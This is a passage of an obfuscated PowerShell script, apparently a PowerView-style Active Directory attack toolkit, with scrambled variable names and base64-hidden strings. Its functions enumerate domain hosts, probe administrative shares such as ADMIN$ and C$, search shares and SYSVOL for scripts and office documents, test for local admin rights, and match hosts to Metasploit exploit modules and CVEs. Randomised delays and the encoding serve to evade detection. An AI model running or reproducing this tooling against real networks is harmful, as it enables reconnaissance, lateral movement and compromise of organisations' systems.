            ${_/=\/==\/\/\/=\/=} = @('', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBEAE0ASQBOACQA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEMAJAA='))), "C$", $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABSAEkATgBUACQA'))))
        }
        if($ComputerFile) {
            $ComputerName = gc -Path $ComputerFile
        }
        if(!$ComputerName) { 
            [array]$ComputerName = @()
            if($Domain) {
                ${__/==\/=\_/=\/\__} = @($Domain)
            }
            elseif($SearchForest) {
                ${__/==\/=\_/=\/\__} = ___/\/\___/=\/==\/ | % { $_.Name }
            }
            else {
                ${__/==\/=\_/=\/\__} = @( (______/====\/=\__/).name )
            }
            ForEach ($Domain in ${__/==\/=\_/=\/\__}) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABRAHUAZQByAHkAaQBuAGcAIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4AIABmAG8AcgAgAGgAbwBzAHQAcwA=')))
                $ComputerName += _/=\___/=\_______/ -Domain $Domain -DomainController $DomainController -Filter $ComputerFilter -ADSpath $ComputerADSpath
            }
            $ComputerName = $ComputerName | ? { $_ } | sort -Unique | sort { Get-Random }
            if($($ComputerName.count) -eq 0) {
                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACEA')))
            }
        }
        ${/\_____/\_/=\___/} = {
            param($ComputerName, $Ping, $CheckShareAccess, ${_/=\/==\/\/\/=\/=}, $CheckAdmin)
            ${/==\/\/\/=\/=\/==} = $True
            if($Ping) {
                ${/==\/\/\/=\/=\/==} = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if(${/==\/\/\/=\/=\/==}) {
                ${_/==\/\__/\/\_/\_} = _/==\_/===\_/\/=\_ -ComputerName $ComputerName
                ForEach (${__/=\/\_/\/=\__/\} in ${_/==\/\__/\/\_/\_}) {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABTAGUAcgB2AGUAcgAgAHMAaABhAHIAZQA6ACAAJAB7AF8AXwAvAD0AXAAvAFwAXwAvAFwALwA9AFwAXwBfAC8AXAB9AA==')))
                    ${____/=\___/\/=\__} = ${__/=\/\_/\/=\__/\}.shi1_netname
                    ${_/==\/\/=\____/==} = ${__/=\/\_/\/=\__/\}.shi1_remark
                    $Path = '\\'+$ComputerName+'\'+${____/=\___/\/=\__}
                    if ((${____/=\___/\/=\__}) -and (${____/=\___/\/=\__}.trim() -ne '')) {
                        if($CheckAdmin) {
                            if(${____/=\___/\/=\__}.ToUpper() -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBEAE0ASQBOACQA')))) {
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAXAAkAHsAXwBfAF8AXwAvAD0AXABfAF8AXwAvAFwALwA9AFwAXwBfAH0AIAAJAC0AIAAkAHsAXwAvAD0APQBcAC8AXAAvAD0AXABfAF8AXwBfAC8APQA9AH0A')))
                                }
                                catch {
                                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAYQBjAGMAZQBzAHMAaQBuAGcAIABwAGEAdABoACAAJABQAGEAdABoACAAOgAgACQAXwA=')))
                                }
                            }
                        }
                        elseif (${_/=\/==\/\/\/=\/=} -NotContains ${____/=\___/\/=\__}.ToUpper()) {
                            if($CheckShareAccess) {
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAXAAkAHsAXwBfAF8AXwAvAD0AXABfAF8AXwAvAFwALwA9AFwAXwBfAH0AIAAJAC0AIAAkAHsAXwAvAD0APQBcAC8AXAAvAD0AXABfAF8AXwBfAC8APQA9AH0A')))
                                }
                                catch {
                                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAYQBjAGMAZQBzAHMAaQBuAGcAIABwAGEAdABoACAAJABQAGEAdABoACAAOgAgACQAXwA=')))
                                }
                            }
                            else {
                                $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAXAAkAHsAXwBfAF8AXwAvAD0AXABfAF8AXwAvAFwALwA9AFwAXwBfAH0AIAAJAC0AIAAkAHsAXwAvAD0APQBcAC8AXAAvAD0AXABfAF8AXwBfAC8APQA9AH0A')))
                            }
                        }
                    }
                }
            }
        }
    }
    process {
        if($Threads) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGkAbgBnACAAdABoAHIAZQBhAGQAaQBuAGcAIAB3AGkAdABoACAAdABoAHIAZQBhAGQAcwAgAD0AIAAkAFQAaAByAGUAYQBkAHMA')))
            ${/\______/=\_/\___} = @{
                'Ping' = $(-not $NoPing)
                'CheckShareAccess' = $CheckShareAccess
                'ExcludedShares' = ${_/=\/==\/\/\/=\/=}
                'CheckAdmin' = $CheckAdmin
            }
            ___/==\______/===\ -ComputerName $ComputerName -_/=\__/\/\/==\/==\ ${/\_____/\_/=\___/} -____/\/\_/\_/\/=\/ ${/\______/=\_/\___} -Threads $Threads
        }
        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = ___/==\______/===\ -_______/=\____/\/= -ComputerName $ComputerName -_/=\__/\/\/==\/==\ $Ping -Threads 100
            }
            Write-Verbose "[*] Total number of active hosts: $($ComputerName.count)"
            ${/=\________/\/=\_} = 0
            ForEach (${___/==\/\/==\/=\/} in $ComputerName) {
                ${/=\________/\/=\_} = ${/=\________/\/=\_} + 1
                sleep -Seconds ${_/=\/\_/\/\__/=\_}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[*] Enumerating server ${___/==\/\/==\/=\/} (${/=\________/\/=\_} of $($ComputerName.count))"
                icm -ScriptBlock ${/\_____/\_/=\___/} -ArgumentList ${___/==\/\/==\/=\/}, $False, $CheckShareAccess, ${_/=\/==\/\/\/=\/=}, $CheckAdmin
            }
        }
    }
}
function Invoke-FileFinder {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,
        [String]
        $ComputerFilter,
        [String]
        $ComputerADSpath,
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $ShareList,
        [Switch]
        $OfficeDocs,
        [Switch]
        $FreshEXEs,
        [Alias('Terms')]
        [String[]]
        $SearchTerms, 
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $TermList,
        [String]
        $LastAccessTime,
        [String]
        $LastWriteTime,
        [String]
        $CreationTime,
        [Switch]
        $IncludeC,
        [Switch]
        $IncludeAdmin,
        [Switch]
        $ExcludeFolders,
        [Switch]
        $ExcludeHidden,
        [Switch]
        $CheckWriteAccess,
        [String]
        $OutFile,
        [Switch]
        $NoClobber,
        [Switch]
        $NoPing,
        [UInt32]
        $Delay = 0,
        [Double]
        $Jitter = .3,
        [String]
        $Domain,
        [String]
        $DomainController,
        [Switch]
        $SearchForest,
        [Switch]
        $SearchSYSVOL,
        [ValidateRange(1,100)] 
        [Int]
        $Threads,
        [Switch]
        $UsePSDrive
    )
    begin {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))]) {
            $DebugPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
        }
        ${_/=\/\_/\/\__/=\_} = New-Object System.Random
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABSAHUAbgBuAGkAbgBnACAASQBuAHYAbwBrAGUALQBGAGkAbABlAEYAaQBuAGQAZQByACAAdwBpAHQAaAAgAGQAZQBsAGEAeQAgAG8AZgAgACQARABlAGwAYQB5AA==')))
        ${_/==\/\__/\/\_/\_} = @()
        [String[]] ${_/=\/==\/\/\/=\/=} = @("C$", $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBEAE0ASQBOACQA'))))
        if ($IncludeC) {
            if ($IncludeAdmin) {
                ${_/=\/==\/\/\/=\/=} = @()
            }
            else {
                ${_/=\/==\/\/\/=\/=} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBEAE0ASQBOACQA'))))
            }
        }
        if ($IncludeAdmin) {
            if ($IncludeC) {
                ${_/=\/==\/\/\/=\/=} = @()
            }
            else {
                ${_/=\/==\/\/\/=\/=} = @("C$")
            }
        }
        if(!$NoClobber) {
            if ($OutFile -and (Test-Path -Path $OutFile)) { rd -Path $OutFile }
        }
        if ($TermList) {
            ForEach (${/=\/=\_/==\_____/} in gc -Path $TermList) {
                if ((${/=\/=\_/==\_____/} -ne $Null) -and (${/=\/=\_/==\_____/}.trim() -ne '')) {
                    $SearchTerms += ${/=\/=\_/==\_____/}
                }
            }
        }
        if($ShareList) {
            ForEach (${_/\/===\/=\/\/\/\} in gc -Path $ShareList) {
                if ((${_/\/===\/=\/\/\/\} -ne $Null) -and (${_/\/===\/=\/\/\/\}.trim() -ne '')) {
                    ${__/=\/\_/\/=\__/\} = ${_/\/===\/=\/\/\/\}.Split("`t")[0]
                    ${_/==\/\__/\/\_/\_} += ${__/=\/\_/\/=\__/\}
                }
            }
        }
        else {
            if($ComputerFile) {
                $ComputerName = gc -Path $ComputerFile
            }
            if(!$ComputerName) {
                if($Domain) {
                    ${__/==\/=\_/=\/\__} = @($Domain)
                }
                elseif($SearchForest) {
                    ${__/==\/=\_/=\/\__} = ___/\/\___/=\/==\/ | % { $_.Name }
                }
                else {
                    ${__/==\/=\_/=\/\__} = @( (______/====\/=\__/).name )
                }
                if($SearchSYSVOL) {
                    ForEach ($Domain in ${__/==\/=\_/=\/\__}) {
                        ${/==\/=\_/\_/===\/} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcACQARABvAG0AYQBpAG4AXABTAFkAUwBWAE8ATABcAA==')))
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABBAGQAZABpAG4AZwAgAHMAaABhAHIAZQAgAHMAZQBhAHIAYwBoACAAcABhAHQAaAAgACQAewAvAD0APQBcAC8APQBcAF8ALwBcAF8ALwA9AD0APQBcAC8AfQA=')))
                        ${_/==\/\__/\/\_/\_} += ${/==\/=\_/\_/===\/}
                    }
                    if(!$SearchTerms) {
                        $SearchTerms = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgB2AGIAcwA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBiAGEAdAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBwAHMAMQA='))))
                    }
                }
                else {
                    [array]$ComputerName = @()
                    ForEach ($Domain in ${__/==\/=\_/=\/\__}) {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABRAHUAZQByAHkAaQBuAGcAIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4AIABmAG8AcgAgAGgAbwBzAHQAcwA=')))
                        $ComputerName += _/=\___/=\_______/ -Filter $ComputerFilter -ADSpath $ComputerADSpath -Domain $Domain -DomainController $DomainController
                    }
                    $ComputerName = $ComputerName | ? { $_ } | sort -Unique | sort { Get-Random }
                    if($($ComputerName.Count) -eq 0) {
                        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACEA')))
                    }
                }
            }
        }
        ${/\_____/\_/=\___/} = {
            param($ComputerName, $Ping, ${_/=\/==\/\/\/=\/=}, $SearchTerms, $ExcludeFolders, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $OutFile, $UsePSDrive)
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAOgAgACQAQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAbAB1AGQAZQBkAFMAaABhAHIAZQBzADoAIAAkAHsAXwAvAD0AXAAvAD0APQBcAC8AXAAvAFwALwA9AFwALwA9AH0A')))
            ${/==\/\_/=\/\__/==} = @()
            if($ComputerName.StartsWith("\\")) {
                ${/==\/\_/=\/\__/==} += $ComputerName
            }
            else {
                ${/==\/\/\/=\/=\/==} = $True
                if($Ping) {
                    ${/==\/\/\/=\/=\/==} = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
                }
                if(${/==\/\/\/=\/=\/==}) {
                    ${_/==\/\__/\/\_/\_} = _/==\_/===\_/\/=\_ -ComputerName $ComputerName
                    ForEach (${__/=\/\_/\/=\__/\} in ${_/==\/\__/\/\_/\_}) {
                        ${____/=\___/\/=\__} = ${__/=\/\_/\/=\__/\}.shi1_netname
                        $Path = '\\'+$ComputerName+'\'+${____/=\___/\/=\__}
                        if ((${____/=\___/\/=\__}) -and (${____/=\___/\/=\__}.trim() -ne '')) {
                            if (${_/=\/==\/\/\/=\/=} -NotContains ${____/=\___/\/=\__}.ToUpper()) {
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    ${/==\/\_/=\/\__/==} += $Path
                                }
                                catch {
                                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABOAG8AIABhAGMAYwBlAHMAcwAgAHQAbwAgACQAUABhAHQAaAA=')))
                                }
                            }
                        }
                    }
                }
            }
            ForEach(${__/=\/\_/\/=\__/\} in ${/==\/\_/=\/\__/==}) {
                ${_/\__/=\__/\_/\/\} =  @{
                    'Path' = ${__/=\/\_/\/=\__/\}
                    'SearchTerms' = $SearchTerms
                    'OfficeDocs' = $OfficeDocs
                    'FreshEXEs' = $FreshEXEs
                    'LastAccessTime' = $LastAccessTime
                    'LastWriteTime' = $LastWriteTime
                    'CreationTime' = $CreationTime
                    'ExcludeFolders' = $ExcludeFolders
                    'ExcludeHidden' = $ExcludeHidden
                    'CheckWriteAccess' = $CheckWriteAccess
                    'OutFile' = $OutFile
                    'UsePSDrive' = $UsePSDrive
                }
                ___/\____/\/==\/\/ @_/\__/=\__/\_/\/\
            }
        }
    }
    process {
        if($Threads) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGkAbgBnACAAdABoAHIAZQBhAGQAaQBuAGcAIAB3AGkAdABoACAAdABoAHIAZQBhAGQAcwAgAD0AIAAkAFQAaAByAGUAYQBkAHMA')))
            ${/\______/=\_/\___} = @{
                'Ping' = $(-not $NoPing)
                'ExcludedShares' = ${_/=\/==\/\/\/=\/=}
                'SearchTerms' = $SearchTerms
                'ExcludeFolders' = $ExcludeFolders
                'OfficeDocs' = $OfficeDocs
                'ExcludeHidden' = $ExcludeHidden
                'FreshEXEs' = $FreshEXEs
                'CheckWriteAccess' = $CheckWriteAccess
                'OutFile' = $OutFile
                'UsePSDrive' = $UsePSDrive
            }
            if(${_/==\/\__/\/\_/\_}) {
                ___/==\______/===\ -ComputerName ${_/==\/\__/\/\_/\_} -_/=\__/\/\/==\/==\ ${/\_____/\_/=\___/} -____/\/\_/\_/\/=\/ ${/\______/=\_/\___} -Threads $Threads
            }
            else {
                ___/==\______/===\ -ComputerName $ComputerName -_/=\__/\/\/==\/==\ ${/\_____/\_/=\___/} -____/\/\_/\_/\/=\/ ${/\______/=\_/\___} -Threads $Threads
            }
        }
        else {
            if(${_/==\/\__/\/\_/\_}){
                $ComputerName = ${_/==\/\__/\/\_/\_}
            }
            elseif(-not $NoPing -and ($ComputerName.count -gt 1)) {
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = ___/==\______/===\ -_______/=\____/\/= -ComputerName $ComputerName -_/=\__/\/\/==\/==\ $Ping -Threads 100
            }
            Write-Verbose "[*] Total number of active hosts: $($ComputerName.count)"
            ${/=\________/\/=\_} = 0
            $ComputerName | ? {$_} | % {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByADoAIAAkAF8A')))
                ${/=\________/\/=\_} = ${/=\________/\/=\_} + 1
                sleep -Seconds ${_/=\/\_/\/\__/=\_}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[*] Enumerating server $_ (${/=\________/\/=\_} of $($ComputerName.count))"
                icm -ScriptBlock ${/\_____/\_/=\___/} -ArgumentList $_, $False, ${_/=\/==\/\/\/=\/=}, $SearchTerms, $ExcludeFolders, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $OutFile, $UsePSDrive                
            }
        }
    }
}
function Find-LocalAdminAccess {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,
        [String]
        $ComputerFilter,
        [String]
        $ComputerADSpath,
        [Switch]
        $NoPing,
        [UInt32]
        $Delay = 0,
        [Double]
        $Jitter = .3,
        [String]
        $Domain,
        [String]
        $DomainController,
        [Switch]
        $SearchForest,
        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )
    begin {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))]) {
            $DebugPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
        }
        ${_/=\/\_/\/\__/=\_} = New-Object System.Random
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABSAHUAbgBuAGkAbgBnACAARgBpAG4AZAAtAEwAbwBjAGEAbABBAGQAbQBpAG4AQQBjAGMAZQBzAHMAIAB3AGkAdABoACAAZABlAGwAYQB5ACAAbwBmACAAJABEAGUAbABhAHkA')))
        if($ComputerFile) {
            $ComputerName = gc -Path $ComputerFile
        }
        if(!$ComputerName) {
            [array]$ComputerName = @()
            if($Domain) {
                ${__/==\/=\_/=\/\__} = @($Domain)
            }
            elseif($SearchForest) {
                ${__/==\/=\_/=\/\__} = ___/\/\___/=\/==\/ | % { $_.Name }
            }
            else {
                ${__/==\/=\_/=\/\__} = @( (______/====\/=\__/).name )
            }
            ForEach ($Domain in ${__/==\/=\_/=\/\__}) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABRAHUAZQByAHkAaQBuAGcAIABkAG8AbQBhAGkAbgAgACQARABvAG0AYQBpAG4AIABmAG8AcgAgAGgAbwBzAHQAcwA=')))
                $ComputerName += _/=\___/=\_______/ -Filter $ComputerFilter -ADSpath $ComputerADSpath -Domain $Domain -DomainController $DomainController
            }
            $ComputerName = $ComputerName | ? { $_ } | sort -Unique | sort { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACEA')))
            }
        }
        ${/\_____/\_/=\___/} = {
            param($ComputerName, $Ping)
            ${/==\/\/\/=\/=\/==} = $True
            if($Ping) {
                ${/==\/\/\/=\/=\/==} = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if(${/==\/\/\/=\/=\/==}) {
                ${/====\__/==\____/} = __/=\___/\_/\/==== -ComputerName $ComputerName
                if (${/====\__/==\____/}.IsAdmin) {
                    $ComputerName
                }
            }
        }
    }
    process {
        if($Threads) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGkAbgBnACAAdABoAHIAZQBhAGQAaQBuAGcAIAB3AGkAdABoACAAdABoAHIAZQBhAGQAcwAgAD0AIAAkAFQAaAByAGUAYQBkAHMA')))
            ${/\______/=\_/\___} = @{
                'Ping' = $(-not $NoPing)
            }
            ___/==\______/===\ -ComputerName $ComputerName -_/=\__/\/\/==\/==\ ${/\_____/\_/=\___/} -____/\/\_/\_/\/=\/ ${/\______/=\_/\___} -Threads $Threads
        }
        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = ___/==\______/===\ -_______/=\____/\/= -ComputerName $ComputerName -_/=\__/\/\/==\/==\ $Ping -Threads 100
            }
            Write-Verbose "[*] Total number of active hosts: $($ComputerName.count)"
            ${/=\________/\/=\_} = 0
            ForEach (${___/==\/\/==\/=\/} in $ComputerName) {
                ${/=\________/\/=\_} = ${/=\________/\/=\_} + 1
                sleep -Seconds ${_/=\/\_/\/\__/=\_}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[*] Enumerating server ${___/==\/\/==\/=\/} (${/=\________/\/=\_} of $($ComputerName.count))"
                icm -ScriptBlock ${/\_____/\_/=\___/} -ArgumentList ${___/==\/\/==\/=\/}, $False
            }
        }
    }
}
function Get-ExploitableSystem {
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = '*',
        [String]
        $SPN,
        [String]
        $OperatingSystem = '*',
        [String]
        $ServicePack = '*',
        [String]
        $Filter,
        [Switch]
        $Ping,
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [Switch]
        $Unconstrained,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,
        [Management.Automation.PSCredential]
        $Credential
    )
    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABHAHIAYQBiAGIAaQBuAGcAIABjAG8AbQBwAHUAdABlAHIAIABhAGMAYwBvAHUAbgB0AHMAIABmAHIAbwBtACAAQQBjAHQAaQB2AGUAIABEAGkAcgBlAGMAdABvAHIAeQAuAC4ALgA=')))
    ${_____/\__/\/\_/=\} = New-Object System.Data.DataTable 
    $Null = ${_____/\__/\/\_/=\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdABuAGEAbQBlAA=='))))       
    $Null = ${_____/\__/\/\_/=\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A'))))
    $Null = ${_____/\__/\/\_/=\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA=='))))
    $Null = ${_____/\__/\/\_/=\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBvAG4A'))))
    _/=\___/=\_______/ -FullData @PSBoundParameters | % {
        ${_/\____/==\/\/=\_} = $_.dnshostname
        ${/==\/==\/=\/\_/=\} = $_.operatingsystem
        ${_/==\_/====\_/=\_} = $_.operatingsystemservicepack
        ${/==\/\/\__/===\/\} = $_.lastlogon
        ${______/==\/===\/\} = $_.useraccountcontrol
        ${/\_____/\_/\__/=\} = [convert]::ToString($_.useraccountcontrol,2)
        ${/===\_/\/=\/\__/=} = ${/\_____/\_/\__/=\}.Length - 2
        ${/=\/=\/\__/=\/==\} = ${/\_____/\_/\__/=\}.Substring(${/===\_/\/=\/\__/=},1)
        if (${/=\/=\/\__/=\/==\}  -eq 0) {
            $Null = ${_____/\__/\/\_/=\}.Rows.Add(${_/\____/==\/\/=\_},${/==\/==\/=\/\_/=\},${_/==\_/====\_/=\_},${/==\/\/\__/===\/\})
        }
    }
    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABMAG8AYQBkAGkAbgBnACAAZQB4AHAAbABvAGkAdAAgAGwAaQBzAHQAIABmAG8AcgAgAGMAcgBpAHQAaQBjAGEAbAAgAG0AaQBzAHMAaQBuAGcAIABwAGEAdABjAGgAZQBzAC4ALgAuAA==')))
    ${__/\/=\/===\/\_/\} = New-Object System.Data.DataTable 
    $Null = ${__/\/=\/===\/\_/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))) 
    $Null = ${__/\/=\/===\/\_/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA=='))))
    $Null = ${__/\/=\/===\/\_/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBzAGYATQBvAGQAdQBsAGUA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBWAEUA'))))
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgADcA'))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA'))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA='))))  
    $Null = ${__/\/=\/===\/\_/\}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA'))))  
